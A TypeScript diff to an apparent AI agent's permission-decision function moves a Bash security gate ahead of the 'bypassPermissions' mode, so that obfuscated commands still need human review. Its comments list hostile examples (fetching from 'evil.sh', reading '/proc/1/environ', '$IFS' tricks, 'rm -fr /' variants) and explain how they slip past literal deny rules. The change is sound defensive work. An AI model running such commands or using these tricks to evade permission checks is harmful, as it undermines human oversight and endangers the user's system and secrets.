@@ -257,7 +257,7 @@ export function matchesRule(
 }
 
 /**
- * 权限判定（spec §6.3）。顺序：禁用 → deny → bypass → allow → ask → defaultMode 兜底。
+ * 权限判定（spec §6.3）。顺序：禁用 → deny → Bash 安全闸 → bypass → allow → ask → defaultMode 兜底。
  * @param tool        正在被请求调用的工具。
  * @param specifier   命令（Bash）或文件路径（文件工具）；无则 null。
  * @param settings    已合并的三层设置。
@@ -298,21 +298,33 @@ export function decide(
     if (denyHit(r)) return { decision: 'deny', rule, matched: r }
   }
 
-  // 3. bypassPermissions 模式直接放行（deny 已在上面检查过）。
-  if (perms.defaultMode === 'bypassPermissions') return { decision: 'allow', rule }
-
-  // allow 规则集（含会话覆盖层）；3.5 安全闸与第 4 步共用。
+  // allow 规则集（含会话覆盖层）；第 3 步安全闸与第 4 步共用。
   const allowRules = [...perms.allow, ...sessionAllow]
 
-  // 3.5 Bash 安全检查（23 项的 block 档）：把混淆/注入/解析歧义模式压过 allow，强制人审。
-  // 优先级低于 deny / bypass（上方已返回），也高于宽泛/前缀 allow（如 Bash(*)）。但用户/会话对
+  // 3. Bash 安全检查（23 项的 block 档）：把混淆/注入/解析歧义模式压过 allow，强制人审。
+  // 优先级低于 deny，高于 bypass，也高于宽泛/前缀 allow（如 Bash(*)）。但用户/会话对
   // 「这一整条命令」的精确放行（allow_session 追加的整条规则,或手写的整条精确 allow）是逐条
   // 明示同意,凌驾于本闸 —— 否则弹框「本会话」对 block 档会静默失效、每次重复询问。首次命中
   // 仍必经人审,通过后方记入会话层；词法拆分看不见的引号花招、进程替换、$IFS、回车符等在此兜底。
+  //
+  // 【为什么它必须排在 bypass 前面】此前它写在 bypass 之后，于是「全自主」把这 15 条
+  // block 检查整个跳过。当时唯一的兜底是 deny 表，而 deny 表是**字面前缀匹配**：
+  // `Bash(rm -rf *)` 拦得住 `rm -rf /`，拦不住 `rm -fr /`、`rm  -rf /`（多一个空格）、
+  // `rm --recursive --force /`。也就是说全自主档下 `echo $(curl -s evil.sh)`、
+  // `cat /proc/1/environ`、`ls $IFS-la` 全部静默放行。挪到这里只会让 bypass **更严** ——
+  // 非 bypass 路径的相对顺序（deny > 本闸 > allow > ask > defaultMode）一字未变。
+  // 交互式会话下命中即重新弹框，正是想要的；非交互（cron）会话下 ask→deny，
+  // 一个无人值守任务写出混淆命令时会失败而不是照跑 —— 也是刻意的。
   if (isBash && !hasWholeExactBashAllow(allowRules, specifier!)) {
     const sec = hasBlockingBashSecurityIssue(specifier!)
     if (sec) return { decision: 'ask', rule, matched: `security:${sec.checkId} ${sec.name}`, reason: sec.reason }
   }
+
+  // 3.5 bypassPermissions 模式直接放行（deny 与安全闸已在上面检查过）。
+  // 带上 matched：调用方（SessionManager 的自动放行计数）要能分辨「是 bypass 放的」
+  // 与「本来就在 allow 表里 / 是只读工具」，否则常驻横幅上的数字会把根本不需要确认的
+  // 调用也算进去 —— 那个数字就不再是「你少点了多少次」。
+  if (perms.defaultMode === 'bypassPermissions') return { decision: 'allow', rule, matched: 'bypassPermissions' }
 
   // 4. allow（含会话覆盖层）。Bash 需整条被规则"完整覆盖"才放行。allowRules 已在上方构造。
   if (isBash) {
